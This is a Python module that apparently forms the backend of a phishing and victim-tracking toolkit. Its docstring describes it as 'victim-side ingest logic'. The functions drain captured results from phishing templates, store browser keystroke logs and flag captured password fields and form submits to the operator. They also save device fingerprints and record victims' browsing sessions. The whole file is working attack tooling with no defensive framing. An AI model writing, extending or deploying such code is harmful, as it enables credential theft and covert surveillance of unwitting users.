"""Capture service (P4.1) — victim-side ingest logic.

Extracted verbatim from ``app/blueprints/capture_rx.py`` (receiver poll,
fingerprints, keystrokes) and ``app/blueprints/capture_sessions.py``
(session recording) route bodies.  The blueprints stay thin HTTP
adapters: request parsing, payload validation and error mapping stay
there; file persistence and notification fan-out live here.

No behavior change intended — ``tests/char`` freezes response shapes
and the victim contract (``/receiver`` drain semantics included).
"""
from __future__ import annotations

import json
import os
from datetime import datetime

from app.state import BASE_DIR, send_notification


def poll_template_results() -> str:
    """``/receiver`` poll: drain every template's ``result.txt``.

    NOTE: per-template ``result.txt`` behavior is frozen (HANDOFF
    "DO NOT TOUCH" #4) — moved verbatim, never improved.
    """
    PATH = os.path.join(BASE_DIR, 'templates')
    out = ''
    for name in os.listdir(PATH):
        dirpath = os.path.join(PATH, name)
        if os.path.isdir(dirpath) and not name.startswith('.'):
            result_file = os.path.join(dirpath, 'result.txt')
            if os.path.exists(result_file):
                try:
                    data = open(result_file, 'r', encoding='utf-8',
                                errors='ignore').read()
                    if data.strip():
                        out += data + "\n"
                        open(result_file, 'w').close()
                except Exception:
                    pass
    return out


def save_fingerprint(data: dict) -> dict:
    """Persist one device fingerprint + notify. Returns response payload."""
    fingerprints_dir = os.path.join(BASE_DIR, 'fingerprints')
    os.makedirs(fingerprints_dir, exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    fingerprint_hash = data.get('hash', 'unknown')
    filename = f'fingerprint_{timestamp}_{fingerprint_hash[:8]}.json'
    filepath = os.path.join(fingerprints_dir, filename)
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)
    send_notification({
        "type": "Device Fingerprint Captured",
        "hash": fingerprint_hash,
        "browser": data.get('basic', {}).get('userAgent', 'Unknown'),
        "timestamp": datetime.now().isoformat()
    })
    return {'status': 'success', 'hash': fingerprint_hash}


def save_keystrokes(data: dict) -> dict:
    """Persist one keystroke log batch + notify on sensitive hits."""
    keystrokes_dir = os.path.join(BASE_DIR, 'keystrokes')
    os.makedirs(keystrokes_dir, exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f'keystrokes_{timestamp}.json'
    filepath = os.path.join(keystrokes_dir, filename)
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)
    logs = data.get('logs', [])
    password_count = sum(1 for log in logs
                         if log.get('target', {}).get('type') == 'password')
    form_submit_count = sum(1 for log in logs
                            if log.get('type') == 'submit')
    if password_count > 0 or form_submit_count > 0:
        send_notification({
            "type": "Keystrokes Captured",
            "logs_count": len(logs),
            "passwords": password_count,
            "form_submits": form_submit_count,
            "url": data.get('url', 'Unknown'),
            "timestamp": datetime.now().isoformat()
        })
    return {'status': 'success', 'count': len(logs)}


def session_start(data: dict) -> dict:
    """Persist session-recording metadata + notify."""
    sessions_dir = os.path.join(BASE_DIR, 'sessions')
    os.makedirs(sessions_dir, exist_ok=True)
    session_id = data.get('sessionId')
    filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=2)
    send_notification({
        "type": "Session Recording Started",
        "sessionId": session_id,
        "url": data.get('url', 'Unknown'),
        "timestamp": datetime.now().isoformat()
    })
    return {'status': 'success', 'sessionId': session_id}


def session_events(data: dict) -> dict:
    """Append one batch of session events (JSONL, append-mode)."""
    sessions_dir = os.path.join(BASE_DIR, 'sessions')
    os.makedirs(sessions_dir, exist_ok=True)
    session_id = data.get('sessionId')
    filepath = os.path.join(sessions_dir, f'{session_id}_events.jsonl')
    with open(filepath, 'a') as f:
        for event in data.get('events', []):
            f.write(json.dumps(event) + '\n')
    return {'status': 'success', 'count': len(data.get('events', []))}


def session_end(data: dict) -> dict:
    """Finalize session metadata (endTime/duration) + notify."""
    session_id = data.get('sessionId')
    sessions_dir = os.path.join(BASE_DIR, 'sessions')
    meta_filepath = os.path.join(sessions_dir, f'{session_id}_meta.json')
    if os.path.exists(meta_filepath):
        with open(meta_filepath, 'r') as f:
            meta = json.load(f)
        meta['endTime'] = data.get('timestamp')
        meta['duration'] = data.get('duration', 0)
        with open(meta_filepath, 'w') as f:
            json.dump(meta, f, indent=2)
    send_notification({
        "type": "Session Recording Ended",
        "sessionId": session_id,
        "duration": data.get('duration', 0),
        "timestamp": datetime.now().isoformat()
    })
    return {'status': 'success'}


__all__ = [
    "poll_template_results", "save_fingerprint", "save_keystrokes",
    "session_start", "session_events", "session_end",
]
